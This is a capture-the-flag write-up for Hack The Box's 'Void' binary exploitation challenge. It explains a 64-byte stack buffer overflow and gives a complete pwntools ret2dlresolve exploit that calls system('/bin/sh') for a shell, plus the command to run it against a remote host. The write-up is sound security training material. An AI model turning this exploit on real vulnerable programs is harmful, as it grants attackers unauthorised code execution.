# Void – Hack The Box

**Category:** Pwn  

## Description

Void is a binary exploitation challenge involving a stack-based buffer overflow and the ret2dlresolve technique.

The binary contains a vulnerable function that reads 200 bytes of user-controlled input into a 64-byte stack buffer. This allows an attacker to overwrite the saved return address and control program execution.

## 1. Challenge Files

After extracting the challenge archive, the directory contained:

```text
challenge/
├── glibc/
│   ├── ld-linux-x86-64.so.2
│   └── libc.so.6
├── void
└── flag.txt
```

The executable was inspected using:

```bash
file void
strings void
nm -C void
```

The binary was identified as a dynamically linked 64-bit Linux ELF executable for x86-64.

## 2. Identify the Vulnerability

The vulnerable function:

```c
void vuln() {
    char data[64];
    read(0, data, 200);
}

int main() {
    vuln();
    return 0;
}
```

The `read()` function accepts 200 bytes of input into a 64-byte buffer without checking the buffer's size.

This creates a stack-based buffer overflow.

The offset required to reach the saved return address is **72 bytes**.

## 3. Check Binary Protections

Command:

```bash
checksec --file=void
```

Security properties:

- Architecture: amd64
- RELRO: Partial RELRO
- Stack Canary: Not found
- NX: Enabled
- PIE: Disabled
- Base address: `0x400000`
- RUNPATH: `./glibc/`

## 4. Exploitation – ret2dlresolve

The binary does not directly provide the `system()` function.

The ret2dlresolve technique allows us to exploit the dynamic linker to resolve the address of `system()` at runtime.

The payload performs the following operations:

1. Adds 72 bytes of padding to overwrite the saved return address.
2. Uses a ROP chain to call `read(0, dlresolve.data_addr)`.
3. Places the dynamic resolution payload in writable memory.
4. Uses `ret2dlresolve()` to invoke the dynamic linker.
5. Resolves and executes `system("/bin/sh")`.
6. Opens an interactive shell.

## 5. Exploit Code

Created the exploit script:

```bash
nano solve.py
```

Complete Python exploit:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = 'void'

rop = ROP(context.binary)

dlresolve = Ret2dlresolvePayload(
    context.binary,
    symbol='system',
    args=['/bin/sh\0']
)

rop.read(0, dlresolve.data_addr)
rop.raw(rop.ret[0])
rop.ret2dlresolve(dlresolve)

raw_rop = rop.chain()

if len(sys.argv) == 1:
    p = context.binary.process()
else:
    host, port = sys.argv[1].split(':')
    p = remote(host, port)

p.sendline(b'A' * 72 + raw_rop)
p.sendline(dlresolve.payload)

p.interactive()
```

## 6. Run the Exploit

Activate the Python virtual environment:

```bash
source pwn-env/bin/activate
```

Install Pwntools:

```bash
python -m pip install pwntools
```

Run the exploit against the active remote instance:

```bash
python solve.py 154.57.164.66:34504
```

If successful, the exploit provides an interactive shell on the remote target.

## 7. Retrieve the Flag

After obtaining the shell, verify access:

```bash
id
```

Then retrieve the flag:

```bash
cat flag.txt
```

## 8. Flag

```text
HTB{YOUR_FLAG_HERE}
```

Replace the placeholder with the actual flag obtained from the remote instance.

**Note:** The `flag.txt` included in the downloaded archive contained a fake testing flag, not the actual remote challenge flag.
